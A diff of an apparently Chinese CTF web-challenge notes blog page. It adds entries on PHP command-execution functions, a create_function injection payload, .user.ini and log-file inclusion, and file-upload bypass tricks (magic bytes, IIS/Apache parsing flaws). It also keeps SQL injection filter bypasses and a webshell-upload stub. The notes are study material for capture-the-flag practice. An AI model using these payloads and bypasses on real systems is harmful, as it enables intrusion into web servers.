@@ -27,13 +27,15 @@
 <meta property="og:site_name" content="guayu-kakeru">
 <meta property="og:description" content="个人web小白题刷题笔记">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6842ed1d58cb8da5c83744fe.png">
 <meta property="article:published_time" content="2025-02-23T12:20:33.000Z">
-<meta property="article:modified_time" content="2025-06-06T13:01:56.901Z">
+<meta property="article:modified_time" content="2025-06-06T16:45:40.244Z">
 <meta property="article:author" content="guayu-kakeru">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="web">
 <meta property="article:tag" content="笔记">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/6842ed1d58cb8da5c83744fe.png">
 
 <link rel="canonical" href="https://guayu-kakeru.github.io/posts/59777.html">
 
@@ -138,7 +140,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">76</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">77</span></a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -226,7 +228,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-06 21:01:56" itemprop="dateModified" datetime="2025-06-06T21:01:56+08:00">2025-06-06</time>
+                <time title="修改时间：2025-06-07 00:45:40" itemprop="dateModified" datetime="2025-06-07T00:45:40+08:00">2025-06-07</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -331,31 +333,49 @@
   <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">MyNamespace</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strlen</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Custom strlen function in MyNamespace&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="string">&quot;Hello, World!&quot;</span>);  <span class="comment">// 调用的是当前命名空间中的 strlen()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果你想调用 PHP 原生的 strlen 函数，应该使用绝对路径</span></span><br><span class="line"><span class="keyword">echo</span> \<span class="title function_ invoke__">strlen</span>(<span class="string">&quot;Hello, World!&quot;</span>);  <span class="comment">// 调用全局的 strlen()</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div></li>
 <li><p>PHP 中的 <code>call_user_func()</code>函数：<br>call_user_func() 是 PHP 的一个回调函数调用方法，它可以用于 动态调用函数 或 类的方法，即在运行时决定要执行哪个函数，而不是在代码编写时就固定。</p>
   <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PERL"><figure class="iseeu highlight /perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    static function sayHello(<span class="variable">$name</span>) &#123;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, <span class="variable">$name</span>!&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">echo call_user_func([<span class="string">&quot;Demo&quot;</span>, <span class="string">&quot;sayHello&quot;</span>], <span class="string">&quot;Alice&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+
 </li>
-<li><p>php伪协议：</p>
-  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STATA"><figure class="iseeu highlight /stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1）<span class="keyword">file</span>:<span class="comment">// 访问本地文件系统</span></span><br><span class="line">2）http:<span class="comment">// 访问 HTTP (S) 网址</span></span><br><span class="line">3）ftp:<span class="comment">// 访问 FTP (S) URL</span></span><br><span class="line">4) php:<span class="comment">// 访问各个输出输入流</span></span><br><span class="line">5) zlib:<span class="comment">// 处理压缩流</span></span><br><span class="line">6) data:<span class="comment">// 读取数据</span></span><br><span class="line">7) <span class="keyword">glob</span>:<span class="comment">// 查找匹配的文件路径模式</span></span><br><span class="line">8) phar:<span class="comment">// PHP 归档</span></span><br><span class="line">9) rar:<span class="comment">// RAR 数据压缩</span></span><br></pre></td></tr></table></figure></div>
-<p>用data伪协议也可以读文件data:&#x2F;&#x2F;text&#x2F;plain;base64,<code>[base64]</code></p>
+<li><p><code>data://</code> 伪协议允许在 URL 直接存储数据，而不需要实际文件。</p>
 </li>
-<li><p><code>file_get_contents()</code> 是 PHP 读取文件内容的函数，它可以：</p>
-</li>
-</ul>
-<p>&emsp;读取本地文件 (<code>file://</code>)<br>&emsp;读取远程文件 (<code>http://</code> &#x2F; <code>https://</code>)<br>&emsp;读取特殊流 (<code>php://input</code>, <code>data://</code> 等)<br>&emsp;读取压缩文件 (<code>compress.zlib://</code>)<br> <mark><code>enctype=&quot;multipart/form-data&quot;</code> 的时候 <code>php://input</code> 是无效的</marked></p>
-<ul>
-<li><code>data://</code> 伪协议允许在 URL 直接存储数据，而不需要实际文件。</li>
-<li><code>intval()</code> 是 PHP 的一个函数，它用于将变量转换为整数（integer）。它的基本用法如下：  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">intval</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span>): <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span>（必需）：要转换的值，可以是字符串、浮点数、布尔值等。</span><br><span class="line"><span class="variable">$base</span>（可选）：进制，默认为 <span class="number">10</span>。仅当 <span class="variable">$value</span> 是字符串时有效，可用于转换不同进制的数字（如二进制、十六进制）。</span><br></pre></td></tr></table></figure></div>
+<li><p><code>intval()</code> 是 PHP 的一个函数，它用于将变量转换为整数（integer）。它的基本用法如下：</p>
+  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">intval</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span>): <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span>（必需）：要转换的值，可以是字符串、浮点数、布尔值等。</span><br><span class="line"><span class="variable">$base</span>（可选）：进制，默认为 <span class="number">10</span>。仅当 <span class="variable">$value</span> 是字符串时有效，可用于转换不同进制的数字（如二进制、十六进制）。</span><br></pre></td></tr></table></figure></div>
   <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="built_in">intval</span>(&quot;<span class="number">42</span>&quot;); <span class="comment">// 输出: 42 </span></span><br><span class="line">echo <span class="built_in">intval</span>(&quot;<span class="number">42</span>abc&quot;); <span class="comment">// 输出: 42（遇到非数字字符停止转换） </span></span><br><span class="line">echo <span class="built_in">intval</span>(&quot;abc42&quot;); <span class="comment">// 输出: 0（无法转换则返回 0）</span></span><br><span class="line">echo <span class="built_in">intval</span>(<span class="number">4.9</span>); <span class="comment">// 输出: 4（直接取整，不是四舍五入） </span></span><br><span class="line">echo <span class="built_in">intval</span>(-<span class="number">4.9</span>); <span class="comment">// 输出: -4</span></span><br></pre></td></tr></table></figure></div></li>
-<li>preg_match &#x2F;i是大小写不敏感的</li>
-<li>php中的几类属性： public公有的属性或方法可以在任何地方被访问，包括类的内部、外部以及子类中<br>private私有的属性或方法只能在其定义的类内部被访问，不能在子类或类的外部访问<br>protected受保护的属性或方法只能在类的内部、子类或父类中被访问，不能在类的外部直接访问</li>
-<li>在 PHP 中，<code>strstr()</code> 函数用于在一个字符串中查找指定的子字符串，并返回从该子字符串首次出现的位置开始的剩余部分。</li>
-<li>在 PHP 里，若向 <code>strcmp</code> 函数传入数组而非字符串，会引发警告并返回 <code>null</code>。由于 <code>null</code> 在布尔上下文中被视为 <code>false</code>，经过逻辑非运算符 <code>!</code> 处理后就变成了 <code>true</code>。因此，当你以数组形式传入 <code>passwd</code> 参数时，这个条件表达式会被判定为真，从而实现绕过。 <code>passwd[]=1</code></li>
-<li>要看文件b的内容，但是只能在文件b写内容和在文件b里面 ，可以写<code>&lt;?php include &#39;/etc/natas_webpass/natas26&#39;; ?&gt;</code></li>
-<li>php中读取文件目录的函数还有scandir  过滤了. 可以用chr(47) 也就是chr + ascii码的方式绕过</li>
-<li>php中的show_source是查看内容的函数 或者file_get_contents</li>
-<li>php中用get和post传入的参数如果有<code>.和空格</code>会转换成下划线<code>_</code>,如果是<code>+</code>号会转换成<code>空格</code> （可以连续变换 +号变成空格再变成下划线）</li>
-<li>把字母数字全部禁用，后面是执行两个变量的动态函数，可以通过<code>\create_function</code>调用全局函数，并且绕过waf，然后b用<code>&#125;</code>闭合插入想要执行的命令，最后<code>/*</code>注释后面的内容</li>
+<li><p>preg_match &#x2F;i是大小写不敏感的</p>
+</li>
+<li><p>php中的几类属性： public公有的属性或方法可以在任何地方被访问，包括类的内部、外部以及子类中<br>private私有的属性或方法只能在其定义的类内部被访问，不能在子类或类的外部访问<br>protected受保护的属性或方法只能在类的内部、子类或父类中被访问，不能在类的外部直接访问</p>
+</li>
+<li><p>在 PHP 中，<code>strstr()</code> 函数用于在一个字符串中查找指定的子字符串，并返回从该子字符串首次出现的位置开始的剩余部分。</p>
+</li>
+<li><p>在 PHP 里，若向 <code>strcmp</code> 函数传入数组而非字符串，会引发警告并返回 <code>null</code>。由于 <code>null</code> 在布尔上下文中被视为 <code>false</code>，经过逻辑非运算符 <code>!</code> 处理后就变成了 <code>true</code>。因此，当你以数组形式传入 <code>passwd</code> 参数时，这个条件表达式会被判定为真，从而实现绕过。 <code>passwd[]=1</code></p>
+</li>
+<li><p>要看文件b的内容，但是只能在文件b写内容和在文件b里面 ，可以写<code>&lt;?php include &#39;/etc/natas_webpass/natas26&#39;; ?&gt;</code></p>
+</li>
+<li><p>php中读取文件目录的函数还有scandir  过滤了. 可以用chr(47) 也就是chr + ascii码的方式绕过</p>
+</li>
+<li><p>php中的show_source是查看内容的函数 或者file_get_contents</p>
+</li>
+<li><p>php中用get和post传入的参数如果有<code>.和空格</code>会转换成下划线<code>_</code>,如果是<code>+</code>号会转换成<code>空格</code> （可以连续变换 +号变成空格再变成下划线）</p>
+</li>
+<li><p>把字母数字全部禁用，后面是执行两个变量的动态函数，可以通过<code>\create_function</code>调用全局函数，并且绕过waf，然后b用<code>&#125;</code>闭合插入想要执行的命令，最后<code>/*</code>注释后面的内容</p>
+</li>
 </ul>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$a</span>))&#123;    show_source(<span class="variable constant_">__FILE__</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">else</span>&#123;    <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$b</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- <span class="keyword">a</span>=\create_function</span><br><span class="line">- b=&#125;<span class="keyword">system</span>(<span class="string">&#x27;你想执行的命令&#x27;</span>);<span class="comment">/*</span></span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>命令函数：  <code>assert</code>在php5和php7中如果传入的是字符串也会被当成命令执行<code>assert($_POST[&#39;cmd&#39;]); </code><br>      <code>create_function</code>也是一个命令执行函数<br>      <code>preg_replace() 配合 /e 修饰符</code></li>
+</ul>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> 将 <span class="string">&#x27;shell&#x27;</span> 这个词替换为 phpinfo() 执行后的结果</span><br><span class="line">preg_replace(<span class="string">&#x27;/shell/e&#x27;</span>, <span class="string">&#x27;phpinfo()&#x27;</span>, <span class="string">&#x27;shell&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
+<pre><code>        `call_user_func() / call_user_func_array()` 调用一个用户自定义的函数。第一个参数是函数名，后面的参数是传给该函数的参数。
+</code></pre>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接调用 assert</span></span><br><span class="line">call_user_func<span class="punctuation">(</span>&#x27;assert&#x27;<span class="punctuation">,</span> &#x27;phpinfo()&#x27;<span class="punctuation">)</span><span class="punctuation">;</span></span><br></pre></td></tr></table></figure>
+<pre><code>    系统执行命令函数： system exec shell_exec 反引号   exec
+    `passthru` 执行一个外部命令，并且直接显示所有输出，适合用来输出二进制数据（比如图片）。 
+</code></pre>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ISBL"><figure class="iseeu highlight /isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">header</span>(<span class="string">&#x27;Content-Type: text/plain&#x27;</span>); <span class="comment">// 确保浏览器按纯文本显示</span></span></span><br><span class="line"><span class="function"><span class="title">passthru</span>(<span class="string">&#x27;cat /etc/hosts&#x27;</span>);</span></span><br></pre></td></tr></table></figure></div>
+<pre><code>    popen() proc_open() : 这两个函数更强大，它们会打开一个进程“管道”，可以像读写文件一样与命令进行交互（比如向命令输入数据，或读取命令的输出）。
+</code></pre>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MEL"><figure class="iseeu highlight /mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &#x27;r&#x27; 表示读取命令的输出</span></span><br><span class="line">$handle = <span class="keyword">popen</span>(<span class="string">&#x27;ls -la&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">$read = <span class="keyword">fread</span>($handle, <span class="number">2096</span>);</span><br><span class="line">echo $read;</span><br><span class="line"><span class="keyword">pclose</span>($handle);</span><br></pre></td></tr></table></figure></div>
+
 <h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><ul>
 <li>sql注入单引号被过滤的时候用双引号</li>
 <li>常见sql注入过滤  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOHOTKEY"><figure class="iseeu highlight /autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">空格过滤 → 用 `/**/`、`%<span class="number">0</span>a`、`%<span class="number">0</span>d` 代替。</span><br><span class="line">引号过滤 → 用 `Hex` 编码或字符串函数（如 `CHAR(<span class="number">97</span>)`）。</span><br><span class="line">关键词过滤  → 尝试大小写、内联注释（`SEL<span class="comment">/*!*/</span>ECT`）、冗余语法（`UNION ALL SELECT`）。</span><br><span class="line">逗号过滤  → 使用 `JOIN` 代替 `UNION SELECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>`。</span><br><span class="line">等号过滤  → 用 `LIKE` 或 `IN` 绕过，例如 `WHERE id LIKE <span class="number">1</span>`。</span><br></pre></td></tr></table></figure></div></li>
@@ -397,7 +417,6 @@
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/tmp/</span>sess_abc123def456</span><br></pre></td></tr></table></figure></div>
 <ul>
 <li>在单引号字符串中插入单引号的办法<code>&#39;&quot;&#39;&quot;&#39;</code><br>&emsp;原理： <strong>将字符串拆分成多段</strong>，通过交替使用单引号 <code>&#39;</code> 和双引号 <code>&quot;</code>，间接插入单引号字符。其实就是一种拼接的形式  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOIT"><figure class="iseeu highlight /autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 错误示例，会导致解析错误 echo <span class="string">&#x27;This is a &#x27;</span>test<span class="string">&#x27; string.&#x27;</span> </span></span><br><span class="line">    <span class="meta"># 正确示例 echo <span class="string">&#x27;This is a &#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27;test&#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27; string.&#x27;</span></span></span><br><span class="line">    <span class="meta">#等效于</span></span><br><span class="line">    <span class="string">&#x27;&lt;?php system (&#x27;</span> + <span class="string">&quot;&#x27;&quot;</span> + <span class="string">&#x27;cat fl*&#x27;</span> + <span class="string">&quot;&#x27;&quot;</span> + <span class="string">&#x27;);?&gt;&#x27;</span></span><br></pre></td></tr></table></figure></div></li>
-<li><code>$IFS</code>（Internal Field Separator）是 Bash 里的内部字段分隔符，默认是空格。</li>
 <li>在linux中命令中间有分隔符，单引号双引号反斜杠反引号也可以照样执行命令比如<code>l&#39;&#39;s l&quot;&quot;s l\s l``s</code></li>
 <li>shellshock漏洞:，Bash <strong>在解析环境变量时存在漏洞</strong>，如果环境变量的值以 <code>()</code> 开头并带有 <strong>额外的命令</strong>，Bash 会<strong>在解析时执行这些命令</strong>，即使它们不在函数体内。</li>
 </ul>
@@ -433,11 +452,57 @@
 </li>
 <li><code>.htaccess</code> 是一个纯文本文件，它里面存放着 Apache 服务器配置相关的指令。<br> .htaccess 主要的作用有：URL 重写、自定义错误页面、MIME 类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义 404 错误页面、阻止 &#x2F; 允许特定 IP&#x2F;IP 段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。<br> .htaccess 的用途范围主要针对当前目录。  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment"># jpg文件解析成php文件</span></span><br><span class="line">   <span class="section">&lt;FilesMatch <span class="string">&quot;\.jpg$&quot;</span>&gt;</span></span><br><span class="line"><span class="attribute">SetHandler</span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure></div></li>
 <li>在 php 中 <code>&quot;.user.ini&quot;</code> 有如下解释：php 会在每个目录下搜寻文件名，如果设定为空字符串则 php 不会搜寻，也就是在 “.user.ini” 中如果设置了文件    名，那么任意一个页面都将该文件中的内容包含进去。有两种方法：<br> auto_prepend_file: 在页面顶部加载文件<br> auto_append_file: 在页面底部加载文件<br> 而且这种方式解析的文件都会被当作php文件执行，在一些文件上传题目也会碰到</li>
-<li>在文件内容的开头输入 <code>GIF89a</code> 主要用于绕过 <strong>MIME 类型检测</strong> 和 <strong>Web 服务器的文件格式验证</strong>，在有检测上传文件类型的题目中可以在修改成jpg文件的前面加上这句</li>
+<li>如果环境支持<code>伪协议</code>，用<code>user.ini</code>也可以包含伪协议</li>
+</ul>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.user</span><span class="selector-class">.ini</span></span><br><span class="line">auto_append_file=php:<span class="comment">//input</span></span><br></pre></td></tr></table></figure></div>
+<p><img src="https://pic1.imgdb.cn/item/6842ed1d58cb8da5c83744fe.png"><br>还可以包含日志文件</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARCADE"><figure class="iseeu highlight /arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nginx</span><br><span class="line">auto_prepend_file = <span class="regexp">/var/</span><span class="built_in">log</span>/nginx/access.<span class="built_in">log</span></span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>在文件内容的开头输入 <code>GIF89a</code> 主要用于绕过 <strong>MIME 类型检测</strong> 和 <strong>Web 服务器的文件格式验证</strong>，在有检测上传文件类型的题目中可以在修改成jpg文件的前面加上这句 文件头检测： <table>
+<thead>
+<tr>
+<th align="left">文件类型</th>
+<th align="left">后缀</th>
+<th align="left">文件头 (Hex)</th>
+<th align="left">文件尾 (Hex)</th>
+<th align="left">标志</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>JPEG</strong></td>
+<td align="left">.jpg&#x2F;.jpeg</td>
+<td align="left"><code>FFD8FF</code></td>
+<td align="left"><code>FFD9</code></td>
+<td align="left">JFIF</td>
+</tr>
+<tr>
+<td align="left"><strong>PNG</strong></td>
+<td align="left">.png</td>
+<td align="left"><code>89504E47</code></td>
+<td align="left"><code>AE426082</code></td>
+<td align="left">PNG IEND IHDR</td>
+</tr>
+<tr>
+<td align="left"><strong>GIF</strong></td>
+<td align="left">.gif</td>
+<td align="left"><code>47494638</code></td>
+<td align="left"><code>003B</code></td>
+<td align="left">GIF89a &#x2F; GIF87a</td>
+</tr>
+<tr>
+<td align="left"><strong>TIFF</strong></td>
+<td align="left">.tif&#x2F;.tiff</td>
+<td align="left"><code>49492A00</code></td>
+<td align="left"><code>4D4D2A00</code></td>
+<td align="left">- II MM</td>
+</tr>
+</tbody></table>
+</li>
 <li>文件上传的题目如果对文件的类型有检测就要修改<code>MIME</code>就是content-type 比如<code>image/jpeg</code></li>
 <li>如果是文件上传题对图片的宽和高有要求，尝试在木马文件上面自己定义宽和高  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CPP"><figure class="iseeu highlight /cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> height 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> width 1</span></span><br></pre></td></tr></table></figure></div></li>
-<li>Apache 解析漏洞主要是因为 Apache 默认一个文件可以有多个用。分割得后缀，当最右边的后缀无法识别（mime.types 文件中的为合法后缀）则继续向左看，直到碰到合法后缀才进行解析（以最后一个合法后缀为准） 在一些文件上传问题中可能出现这个问题  所以如果黑名单比较简单，后缀名只看从第一个.开始，就可以上传类似1.php.aaa这样的文件</li>
-<li>apache 换行解析漏洞<br>  影响范围：2.4.0-2.4.29 版本<br>原因：合法后缀配置文件中的正则表达式中 $ 不仅匹配字符串结尾位置，还可以匹配 \n 或 \r，在解析 php 时，1.php\x0A 将按照.php 进行解析，而’.php\x0A’ !&#x3D; ‘.php’, 可能过滤时过滤了.php 但没有过滤.php\x0A 从而实现绕过。配置文件：过滤后缀名.phpapache 2.4.7 无法上传 hhh.php, 上传 hhh.php.xxx 可以绕过。</li>
+<li><code>Apache 解析漏洞</code>主要是因为 Apache 默认一个文件可以有多个用。分割得后缀，当最右边的后缀无法识别（mime.types 文件中的为合法后缀）则继续向左看，直到碰到合法后缀才进行解析（以最后一个合法后缀为准） 在一些文件上传问题中可能出现这个问题  所以如果黑名单比较简单，后缀名只看从第一个.开始，就可以上传类似1.php.aaa这样的文件</li>
+<li><code>apache 换行解析漏洞</code><br>  影响范围：2.4.0-2.4.29 版本<br>原因：合法后缀配置文件中的正则表达式中 $ 不仅匹配字符串结尾位置，还可以匹配 \n 或 \r，在解析 php 时，1.php\x0A 将按照.php 进行解析，而’.php\x0A’ !&#x3D; ‘.php’, 可能过滤时过滤了.php 但没有过滤.php\x0A 从而实现绕过。配置文件：过滤后缀名.phpapache 2.4.7 无法上传 hhh.php, 上传 hhh.php.xxx 可以绕过。</li>
+<li><code>iis6.0</code> 的 两种解析漏洞： 1.目录解析： 以*.asp命名的文件夹里的文件都将会被当成ASP文件执行。 2.文件解析： *.asp;.jpg 像这种畸形文件名在“；”后面的直接被忽略，也就是说当成 *.asp文件执行。</li>
 <li>双后缀绕过文件上传限制的时候，gif可以在文件头写GIF89a然后插入php代码，gif这个后缀名有时候会执行php文件</li>
 </ul>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php reverse shell</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
@@ -445,7 +510,16 @@
 <li>在一些情况，文件的后缀被白名单限制死，但是<code>文件名被保存到服务器中</code>，然后前端从数据库中获取文件名，可能造成sql注入 尝试上传select.jpg</li>
 <li>php<code>0x00 %00</code>空白字符截断 原理是最后被解析成chr(0) 这是一个空白字符，空白字符后的内容会被截断造成绕过  漏洞版本很老不常见：php版本小于5.3.4 java版本小于7u40</li>
 <li><code>iconv 字符转换异常</code>造成截断 utf-8字符集  默认的字符编码范围的是0x00-0x7f  php版本低于5.4  <code>123.php%df.jpg   123.php</code></li>
+<li>没有过滤<code>html后缀</code>的时候，可以用html文件来执行xss或者可以直接上传一个由文件上传功能的html文件</li>
+<li>在有<code>getimagesize</code>函数检测是否是图像中，如果能绕过这个函数就可以上传任意的文件<br>xbm格式图片 用定义 宽高的方式就可以检测</li>
 </ul>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MAXIMA"><figure class="iseeu highlight /maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auto_append_file=/<span class="built_in">var</span>/<span class="built_in">log</span>/nginx/access.<span class="built_in">log</span></span><br><span class="line">.user.ini</span><br><span class="line">#<span class="built_in">define</span> <span class="built_in">width</span> <span class="number">100</span>;</span><br><span class="line">#<span class="built_in">define</span> <span class="built_in">height</span> <span class="number">100</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>图片二次渲染： <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/LLdo7obJCs-J_Ek1lFxD7g">https://mp.weixin.qq.com/s/LLdo7obJCs-J_Ek1lFxD7g</a></li>
